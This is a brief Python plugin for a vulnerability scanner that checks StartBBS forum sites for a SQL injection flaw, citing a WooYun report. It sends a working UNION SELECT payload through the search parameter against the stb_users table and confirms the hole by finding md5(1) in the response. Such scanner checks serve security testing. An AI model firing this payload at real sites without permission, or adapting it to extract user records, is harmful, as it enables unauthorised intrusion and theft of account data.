#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by range
#refer:http://www.wooyun.org/bugs/wooyun-2010-067853

import re

def assign(service, arg):
    if service == "startbbs":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200:
        code, head, res, errcode, _ = curl.curl(url + "/index.php/home/search?q=1%27union%20select%201,2,3,4,concat(md5(1),%27|%27,md5(1)),6,7,8,9,0,1,2,3,4,5,6,7%20from%20stb_users--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
        m = re.search('c4ca4238a0b923820dcc509a6f75849b',res)
        if m:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('startbbs', 'http://www.example.com/')[1])